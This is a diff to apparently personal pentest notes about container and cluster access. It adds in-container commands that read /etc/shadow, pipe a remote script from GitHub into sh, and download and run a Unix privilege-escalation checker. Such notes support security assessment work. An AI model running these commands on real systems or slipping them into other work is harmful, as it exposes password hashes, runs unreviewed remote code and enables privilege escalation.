@@ -48,8 +48,18 @@ Exec into the container
 
 And things to do inside the container
 
-  
+    id && uname -a && pwd && env
+    cat /etc/shadow
 
+Checks Unix system for simple privilege escalations - Cron
+
+    curl https://raw.githubusercontent.com/hexobandit/knowledge-db/refs/heads/main/check_cron_access.sh | sh
+
+Checks Unix system for simple privilege escalations - Pentest Monkey 
+
+    curl https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/refs/heads/1_x/unix-privesc-check > unix-privesc-check.sh
+    chmod +x unix-privesc-check.sh
+    ./unix-privesc-check.sh
 
 ## More Than One Cluster?
 See all existting clusters
